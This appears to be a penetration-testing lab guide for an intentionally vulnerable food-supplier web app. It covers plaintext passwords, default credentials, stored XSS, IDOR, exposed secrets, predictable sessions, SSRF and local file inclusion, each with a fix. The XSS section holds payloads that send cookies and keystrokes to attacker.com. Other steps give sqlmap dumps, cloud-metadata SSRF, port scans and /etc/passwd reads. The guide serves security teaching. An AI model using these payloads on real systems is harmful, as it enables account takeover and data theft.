## Additional Vulnerabilities to Discover

You've now tested IDOR and SQL Injection from the main guide. This application contains 13 additional intentional security vulnerabilities organised by severity. Use this as a checklist for your penetration test.

### 🔴 CRITICAL Severity

#### 1. Plaintext Password Storage
**Location**: User authentication system  
**What to look for**: Passwords stored without hashing (bcrypt, scrypt, etc.)  
**Impact**: If database is compromised, all user passwords are immediately exposed  
**OWASP**: A02:2021 - Cryptographic Failures

**How to Test:**

**Step 1: Extract Database Using SQLmap**
```bash
# Use the product search endpoint (already covered in README.md)
sqlmap -u "http://<TARGETIP>:5000/api/products?search=tomato" \
  -T users --dump --batch --dbms=SQLite
```

**Step 2: Examine the Output**
Look at the users table dump:
```
Database: SQLite_masterdb
Table: users
[7 entries]
+----------+------------+---------+
| username | password   | role    |
+----------+------------+---------+
| admin    | admin123   | admin   |  ← Plaintext!
| thepubco | welcome123 | customer|  ← Plaintext!
```

**Expected Result:**
✅ **Vulnerability Confirmed**: Passwords are stored in plaintext, not hashed

**Why This is Dangerous:**
- Database breach = instant credential compromise
- Users often reuse passwords across services
- Violates GDPR, PCI-DSS, and industry standards

**Remediation:**
```typescript
// ❌ CURRENT: Plaintext storage
db.prepare('INSERT INTO users (username, password) VALUES (?, ?)').run(username, password);

// ✅ SECURE: Hash with bcrypt
import bcrypt from 'bcrypt';
const hashedPassword = await bcrypt.hash(password, 10);
db.prepare('INSERT INTO users (username, password) VALUES (?, ?)').run(username, hashedPassword);
```

#### 2. Default/Hardcoded Credentials
**Location**: Pre-populated user accounts  
**Impact**: Immediate administrative access without brute force  
**OWASP**: A07:2021 - Identification and Authentication Failures

**How to Test:**

**Step 1: Try Common Default Credentials**
1. Navigate to `/login`
2. Try these common combinations:
   - `admin` / `admin`
   - `admin` / `admin123` ✅ **This works!**
   - `administrator` / `password`
   - `root` / `root`

**Step 2: Check Documentation**
Default credentials are often documented in README files or comments

**Expected Result:**
✅ **Vulnerability Confirmed**: `admin/admin123` grants full administrative access

**Why This is Dangerous:**
- First thing attackers try
- Automated scanners check for default credentials
- No technical skill required to exploit

**Remediation:**
- Force password change on first login
- Generate random initial passwords
- Never use predictable defaults in production

---

### 🟠 HIGH Severity

**Note**: SQL Injection and IDOR were covered in README.md. The following are additional HIGH severity vulnerabilities.

#### 3. Stored Cross-Site Scripting (XSS)
**Locations**: Profile bio, order notes, contact form  
**Impact**: Session hijacking, credential theft, defacement  
**OWASP**: A03:2021 - Injection

**How to Test:**

**Test Location 1: Profile Bio**

**Step 1: Login and Navigate to Profile**
1. Login as `thepubco` / `welcome123`
2. Click "My Profile" in the sidebar
3. Press **F12** to open Firefox Developer Tools

**Step 2: Inject XSS Payload**
In the **Bio** field, enter:
```html
<img src=x onerror=alert('XSS')>
```

**Step 3: Save and Refresh**
1. Click **Save Profile**
2. Refresh the page
3. Observe the alert box appearing

**Expected Result:**
✅ **Vulnerability Confirmed**: JavaScript executes when the page loads

**Test Location 2: Order Notes (More Dangerous)**

**Step 1: Place an Order with Malicious Note**
1. Navigate to "Place Order"
2. Add products to cart
3. In the **Order Notes** field, enter:
```html
<img src=x onerror=fetch('http://attacker.com/steal?cookie='+document.cookie)>
```
4. Submit the order

**Step 2: View as Admin**
1. Logout and login as `admin` / `admin123`
2. View all orders (admin can see all customer orders)
3. An error message should appear on the screen, (as the attacker website above doesn't exist) - but if it did, we would now have the admins login cookie, and can use that to masquerade as them - and all they did was visit a page.

**Expected Result:**
✅ **Vulnerability Confirmed**: Admin's session cookie is sent to attacker's server

**Why This is Dangerous:**
- **Session hijacking**: Steal admin cookies
- **Credential harvesting**: Inject fake login forms
- **Defacement**: Modify page content
- **Keylogging**: Capture user input

**Additional Payloads to Try:**
```html
<!-- Cookie theft -->
<img src=x onerror=alert(document.cookie)>

<!-- Redirect to phishing site -->
<img src=x onerror=window.location='http://evil.com'>

<!-- Keylogger -->
<img src=x onerror="document.onkeypress=function(e){fetch('http://attacker.com/log?key='+e.key)}">
```

**Note**: `<script>` tags may not execute in React apps due to browser protections against `innerHTML` insertion. Use event handlers instead.

**Remediation:**
```typescript
// ❌ VULNERABLE: Direct HTML insertion
<div dangerouslySetInnerHTML={{__html: userBio}} />

// ✅ SECURE: Sanitise input
import DOMPurify from 'dompurify';
const cleanBio = DOMPurify.sanitize(userBio);
<div dangerouslySetInnerHTML={{__html: cleanBio}} />

// ✅ BETTER: Use text content only
<div>{userBio}</div>
```

#### 4. IDOR in User Profiles
**Location**: `/api/profile/:userId`  
**Impact**: Unauthorised access to other users' personal information  
**OWASP**: A01:2021 - Broken Access Control

**Note**: IDOR in orders was covered in README.md. This tests IDOR in a different endpoint.

**How to Test:**

**Step 1: Discover Your User ID**
1. Login as `thepubco` / `welcome123`
2. Press **F12** to open Firefox Developer Tools
3. Go to the **Network** tab
4. Navigate to "Profile" in the sidebar
5. Find the request to `/api/profile` or `/api/user`
6. In the **Response** tab, note your user ID (e.g., `5f68c067-1c1e-4464-9f45-2f62aecbfaea`)

**Step 2: Capture Other User IDs**
1. Logout and login as `bella_italia` / `pasta2024`
2. Open the **Console** tab in Developer Tools
3. Try accessing thepubco's user data using their UUID:
```javascript
// Replace with actual UUID from Step 1
fetch('/api/user/THEPUBCO_UUID_HERE')
  .then(r => r.json())
  .then(data => console.log('Stolen profile:', data))
  .catch(e => console.log('Error:', e))
```
4. Repeat for other accounts to collect multiple user IDs

**Expected Result:**
✅ **Vulnerability Confirmed**: You can view other users' profiles including:
- Email addresses
- Phone numbers
- Company names
- Delivery addresses

**Why This is Dangerous:**
- **Privacy breach**: GDPR violation
- **Competitive intelligence**: Discover all customers
- **Targeted attacks**: Gather information for phishing

**Remediation:**
```typescript
// ❌ VULNERABLE: No ownership check
app.get("/api/profile/:userId", (req, res) => {
  const profile = db.prepare('SELECT * FROM users WHERE id=?').get(req.params.userId);
  res.json(profile);
});

// ✅ SECURE: Verify ownership
app.get("/api/profile/:userId", (req, res) => {
  if (req.params.userId !== req.session.userId && req.session.role !== 'admin') {
    return res.status(403).json({ error: "Unauthorised" });
  }
  const profile = db.prepare('SELECT * FROM users WHERE id=?').get(req.params.userId);
  res.json(profile);
});
```

#### 5. Exposed Secrets in Client Code
**Location**: JavaScript source code, environment variables  
**Impact**: Credential compromise, API abuse  
**OWASP**: A05:2021 - Security Misconfiguration

**How to Test:**

**Step 1: Check Config Endpoints**
Try accessing common configuration endpoints:
```javascript
// In the Console tab
fetch('/api/config')
  .then(r => r.json())
  .then(data => console.log('Config:', data))
```

**Expected Response:**
```json
{
  "environment": "development",
  "version": "1.0.0",
  "database": "in-memory",
  "sessionSecret": "manchester-fresh-2024",
  "adminUsername": "admin"
}
```

**Expected Result:**
✅ **Vulnerability Confirmed**: Sensitive configuration exposed

**What This Reveals:**
- **Session secret**: `manchester-fresh-2024` (can forge session tokens)
- **Admin username**: `admin` (reduces brute force attempts)
- **Environment details**: Development mode enabled
- **Database type**: Reveals technology stack

**Step 3: Check Git Configuration**

```bash
curl http://<TARGETIP>:5000/.git/config
```

**Expected Response:**
```
[core]
  repositoryformatversion = 0
[remote "origin"]
  url = https://github.com/manchesterfresh/vulnerable-app.git
# VULNERABILITY: Exposed git repository
# Database credentials: postgres://admin:SecretPassword123@localhost:5432/freshfoods
```

**What This Reveals:**
- **Database credentials**: `admin:SecretPassword123`
- **Repository URL**: Source code location
- **Infrastructure details**: PostgreSQL database

**Why This is Dangerous:**
- **Credential theft**: Direct database access
- **Session forging**: Create valid session tokens with exposed secret
- **Source code access**: Download entire codebase via .git
- **Privilege escalation**: Use admin credentials

**Remediation:**
```typescript
// ❌ VULNERABLE: Exposed config endpoint
app.get("/api/config", (req, res) => {
  res.json({
    sessionSecret: "manchester-fresh-2024",
    adminUsername: "admin"
  });
});

// ✅ SECURE: Remove config endpoint entirely
// Or require admin authentication and return only safe values
app.get("/api/config", requireAdmin, (req, res) => {
  res.json({
    version: "1.0.0",
    environment: "production" // Generic info only
  });
});

// ✅ Block .git directory
app.use((req, res, next) => {
  if (req.path.startsWith('/.git')) {
    return res.status(404).send('Not Found');
  }
  next();
});
```

<details>
<summary> Other things to try on other web applications (*with permission!*) </summary>

**Step 1: Open Firefox Developer Tools**
1. Press **F12**
2. Go to the **Debugger** tab (equivalent to Chrome's Sources)
3. Press **Ctrl+Shift+F** to open "Search in all files"

**Step 2: Search for Sensitive Keywords**
Search for these terms one at a time:
- `api_key`
- `secret`
- `password`
- `token`
- `SESSION_SECRET`
- `AWS_ACCESS_KEY`
- `private_key`

**Step 3: Examine Results**
Look for hardcoded credentials or API keys in the JavaScript bundles

**Method 2: View Page Source**

**Step 1: View Source**
1. Right-click anywhere on the page
2. Select "View Page Source" (or press **Ctrl+U**)

**Step 2: Search for Secrets**
Press **Ctrl+F** and search for:
- `config`
- `env`
- `key`

**Method 3: Check Network Responses**

**Step 1: Monitor Network Traffic**
1. Press **F12** and go to **Network** tab
2. Navigate around the application
3. Look for responses containing configuration data

</details>



#### 6. Predictable Session Tokens
**Location**: Session cookies  
**Impact**: Session enumeration and hijacking  
**OWASP**: A07:2021 - Identification and Authentication Failures

**How to Test:**

**Method 1: Manual Pattern Analysis**

**Step 1: Capture Multiple Session Tokens**
1. Open Firefox and press **F12**
2. Go to the **Storage** tab (equivalent to Chrome's Application tab)
3. Expand **Cookies** → `http://<TARGETIP>:5000`
4. Login as `thepubco` / `welcome123`
5. Note the `connect.sid` cookie value (e.g., `sess_1000_1699876543`)
6. Logout
7. Login again and note the new cookie value (e.g., `sess_1001_1699876789`)
8. Repeat 3-5 times

**Step 2: Analyse the Pattern**
Compare the session tokens:
```
Session 1: sess_1000_1699876543
Session 2: sess_1001_1699876789
Session 3: sess_1002_1699877012
Session 4: sess_1003_1699877234
```

Pattern identified:
- `sess_` prefix
- Sequential counter (1000, 1001, 1002...)
- Underscore separator
- Unix timestamp

**Step 3: Predict and Hijack Sessions**

1. Install the **Cookie Editor** extension for Firefox:
   - Visit: https://addons.mozilla.org/en-GB/firefox/addon/cookie-editor/
   - Click "Add to Firefox"

2. Login as `bella_italia` / `pasta2024`
3. Note your session: e.g. `sess_1005_1699877500` (will be different to this one remember!)
4. Click the Cookie Editor icon in the toolbar
5. Find the `connect.sid` cookie
6. Change the value to predict another user's session. For example, remember the IDs will be different.
   - Try: `sess_1000_1699876543` (thepubco's session)
   - Try: `sess_1004_1699877400` (another active session)
7. Click **Save**
8. Refresh the page

**Expected Result:**
✅ **Vulnerability Confirmed**: You're now logged in as a different user!

**Method 2: Using Burp Suite Sequencer**

**Step 1: Capture Session Tokens**
1. Configure Firefox to use Burp proxy (127.0.0.1:8080)
2. In Burp, go to **Proxy** → **HTTP history**
3. Login/logout 20 times
4. Find all login responses with `Set-Cookie` headers

**Step 2: Analyse Randomness**
1. Right-click a login response → **Send to Sequencer**
2. In Sequencer, click **Start live capture**
3. Perform 100+ logins (or use Intruder to automate)
4. Click **Analyse now**

**Expected Result:**
✅ **Poor randomness**: Burp will report predictable patterns

**Why This is Dangerous:**
- **Session hijacking**: Guess active session tokens
- **Account takeover**: Access any user's account
- **No credentials needed**: Bypass authentication entirely

**Remediation:**
```typescript
// ❌ VULNERABLE: Predictable pattern
const sessionId = `sess_${counter}_${Date.now()}`;

// ✅ SECURE: Cryptographically random
import crypto from 'crypto';
const sessionId = crypto.randomBytes(32).toString('hex');
```

#### 7. Server-Side Request Forgery (SSRF)

Server-Side Request Forgery (SSRF) is a vulnerability where an attacker can abuse the functionality of a server to read or update internal resources. This happens when a web application accepts a URL from a user and fetches the content of that URL without proper validation.

**Location**: `POST /api/fetch-document`  
**Impact**: Access to internal resources, credential exposure, port scanning  
**OWASP**: A10:2021 - Server-Side Request Forgery

**How to Test:**

**Step 1: Test Basic SSRF**

1. Login to the application
2. Press **F12** and go to the **Console** tab
3. Test if the endpoint exists:
```javascript
fetch('/api/fetch-document', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({url: 'http://example.com'})
})
.then(r => r.text())
.then(data => console.log(data))
```

**Step 2: Access Internal Configuration**
```javascript
// Try to access internal API endpoints
fetch('/api/fetch-document', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({url: 'http://<TARGETIP>:5000/api/config'})
})
.then(r => r.json())
.then(data => console.log('Config exposed:', data))
```

**Step 3: Access Internal Files**
```javascript
// Try to read internal data files
fetch('/api/fetch-document', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({url: 'http://<TARGETIP>:5000/data/customers.txt'})
})
.then(r => r.text())
.then(data => console.log('Customer data:', data))
```

**Step 4: Access Cloud Metadata (If on AWS)**
```javascript
// AWS metadata endpoint (contains credentials!)
fetch('/api/fetch-document', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({url: 'http://169.254.169.254/latest/meta-data/'})
})
.then(r => r.text())
.then(data => console.log('AWS metadata:', data))
```

**Step 5: Port Scanning**
```javascript
// Scan internal network
for(let port of [22, 80, 443, 3306, 5432, 6379, 8080]) {
  fetch('/api/fetch-document', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({url: `http://192.168.1.1:${port}`})
  })
  .then(r => console.log(`Port ${port}: Open`))
  .catch(e => console.log(`Port ${port}: Closed`));
}
```

**Alternative: Using curl**
```bash
# Get session cookie first
curl -X POST http://<TARGETIP>:5000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"thepubco","password":"welcome123"}' \
  -c cookies.txt

# Test SSRF
curl -X POST http://<TARGETIP>:5000/api/fetch-document \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"url":"http://<TARGETIP>:5000/api/config"}'
```

**Expected Result:**
✅ **Vulnerability Confirmed**: Server fetches internal resources and returns them

**Why This is Dangerous:**
- **Cloud credential theft**: Access AWS/Azure metadata
- **Internal network access**: Bypass firewalls
- **Port scanning**: Map internal infrastructure
- **Data exfiltration**: Read internal files

**Remediation:**
```typescript
// ❌ VULNERABLE: No URL validation
app.post('/api/fetch-document', async (req, res) => {
  const response = await fetch(req.body.url);
  res.send(await response.text());
});

// ✅ SECURE: Whitelist allowed domains
const ALLOWED_DOMAINS = ['example.com', 'trusted-api.com'];
app.post('/api/fetch-document', async (req, res) => {
  const url = new URL(req.body.url);
  if (!ALLOWED_DOMAINS.includes(url.hostname)) {
    return res.status(403).json({ error: 'Domain not allowed' });
  }
  // Additional checks for private IP ranges
  const response = await fetch(req.body.url);
  res.send(await response.text());
});
```

#### 8. Local File Inclusion (LFI)
**Location**: `GET /api/view-document?file=...`  
**Impact**: Source code disclosure, configuration file access, credential theft  
**OWASP**: A01:2021 - Broken Access Control

**How to Test:**

**Step 1: Test Basic File Access**

1. Login to the application
2. Try accessing a legitimate document:
```
http://<TARGETIP>:5000/api/view-document?file=invoice.pdf
```

**Step 2: Directory Traversal - Read System Files**

Try these payloads in your browser or using curl:

```bash
# Linux/Unix system files (use absolute paths)
http://<TARGETIP>:5000/api/view-document?file=/etc/passwd
http://<TARGETIP>:5000/api/view-document?file=/etc/hosts
```

These payloads are dangerous because they exploit a vulnerability known as Directory Traversal (also called Path Traversal) to access and read sensitive system files on the targeted server.

/etc/passwd: This file contains a list of all user accounts on the system. While it doesn't contain the password hashes (those are in /etc/shadow), it reveals usernames, User IDs (UID), Group IDs (GID), home directory paths, and the default shell for every user. This information is invaluable for an attacker planning further attacks like privilege escalation.

/etc/hosts: This file contains mappings of hostnames to IP addresses for a machine. It reveals information about the server's network configuration and other internal servers or services the machine communicates with. This is crucial for internal network mapping and identifying secondary targets.

By successfully running these payloads, an attacker achieves unauthorised information disclosure, gaining critical intelligence about the server's configuration and user base without needing a valid account or specific permissions, marking a severe compromise of security.


**Step 3: Read Application Source Code**

```bash
# Read server code (relative paths from application root)
http://<TARGETIP>:5000/api/view-document?file=server/index.ts
http://<TARGETIP>:5000/api/view-document?file=server/routes.ts
http://<TARGETIP>:5000/api/view-document?file=server/database.ts

# Read configuration files
http://<TARGETIP>:5000/api/view-document?file=package.json
http://<TARGETIP>:5000/api/view-document?file=.env
```

**Another option: Using curl for Automation**

```bash
# Test LFI - Read system files
curl "http://<TARGETIP>:5000/api/view-document?file=/etc/passwd"

# Read application source code
curl "http://<TARGETIP>:5000/api/view-document?file=server/routes.ts"

# Read package.json
curl "http://<TARGETIP>:5000/api/view-document?file=package.json"
```

**Note**: This endpoint doesn't require authentication!

**Another option: Using Firefox Developer Tools**

1. Press **F12** and go to **Console** tab
2. Execute:
```javascript
fetch('/api/view-document?file=/etc/passwd')
  .then(r => r.json())
  .then(data => console.log(data.content))

fetch('/api/view-document?file=server/routes.ts')
  .then(r => r.json())
  .then(data => console.log('Source code:', data.content))
```

**Expected Result:**
✅ **Vulnerability Confirmed**: You can read arbitrary files from the server

**What You Can Access:**
- `/etc/passwd` - User accounts
- `/etc/hosts` - Network configuration
- `server/routes.ts` - Application source code revealing all vulnerabilities
- `server/index.ts` - Server configuration
- `package.json` - Dependencies and scripts
- `.env` files with secrets (if they exist)

**Why This is Dangerous:**
- **Source code disclosure**: Reveals other vulnerabilities
- **Credential theft**: Database passwords, API keys
- **System reconnaissance**: User accounts, installed software
- **Privilege escalation**: Information for further attacks

**Remediation:**
```typescript
// ❌ VULNERABLE: Direct file path
app.get('/api/view-document', (req, res) => {
  const filePath = req.query.file;
  res.sendFile(filePath);
});

// ✅ SECURE: Whitelist and path validation
import path from 'path';
const ALLOWED_DIR = '/var/www/documents';
const ALLOWED_FILES = ['invoice.pdf', 'terms.pdf', 'privacy.pdf'];

app.get('/api/view-document', (req, res) => {
  const filename = path.basename(req.query.file); // Remove path
  
  if (!ALLOWED_FILES.includes(filename)) {
    return res.status(403).json({ error: 'File not allowed' });
  }
  
  const safePath = path.join(ALLOWED_DIR, filename);
  
  // Ensure path is within allowed directory
  if (!safePath.startsWith(ALLOWED_DIR)) {
    return res.status(403).json({ error: 'Invalid path' });
  }
  
  res.sendFile(safePath);
});
```

#### Now, go on to look at the medium severities markdown document (`ADDITIONAL2.md`)